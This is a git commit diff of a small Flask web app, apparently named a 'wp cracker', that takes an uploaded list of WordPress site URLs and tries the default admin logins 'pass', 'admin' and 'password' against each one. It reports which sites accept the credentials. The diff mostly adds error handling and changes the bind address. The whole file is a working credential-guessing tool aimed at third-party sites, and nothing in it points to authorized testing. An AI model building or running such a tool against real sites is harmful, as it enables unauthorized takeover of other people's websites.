6078c818510188b15c9f8e7fe42b0bca19d9f941
krypton <52121207+krypton-byte@users.noreply.github.com>
2020-03-15 17:01:27 +0000

    Add files via upload

--- web.py
+++ web.py
@@ -6,20 +6,23 @@ def index():
 	return 'wellcome to wp cracker'
 @app.route('/crack',methods=['GET','POST'])
 def auto_wp():
-	x=request.files['list_url'].read().decode('utf-8').split('\n')
-	x.remove('')
-	ve=[]
-	if request.files['list_url']:
-		for j in x:
-			if login.__start__(j,'admin','pass') == True:
-				ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
-			elif login.__start__(j,'admin','admin') == True:
-				ve.append('[sukses] username : %s password : %s result : %s'%('admin','admin',j))
-			elif login.__start__(j,'admin','password') == True:
-				ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
-			else:
-				ve.append(' [gagal!] result : %s'%(j))
-		return str(ve)
-	else:
-		return 'error'
-app.run(host='0.0.0.0',port=8000,debug=True)
+	try:
+		ve=[]
+		if request.files['list_url']:
+			x=request.files['list_url'].read().decode('utf-8').split('\n')
+			x.remove('')
+			for j in x:
+				if login.__start__(j,'admin','pass') == True:
+					ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
+				elif login.__start__(j,'admin','admin') == True:
+					ve.append('[sukses] username : %s password : %s result : %s'%('admin','admin',j))
+				elif login.__start__(j,'admin','password') == True:
+					ve.append('[sukses] username : %s password : %s result : %s'%('admin','pass',j))
+				else:
+					ve.append(' [gagal!] result : %s'%(j))
+			return str(ve)
+		else:
+			return 'error'
+	except KeyError:
+		return 'list tidak ada'
+app.run(host='localhost',port=8000,debug=True)
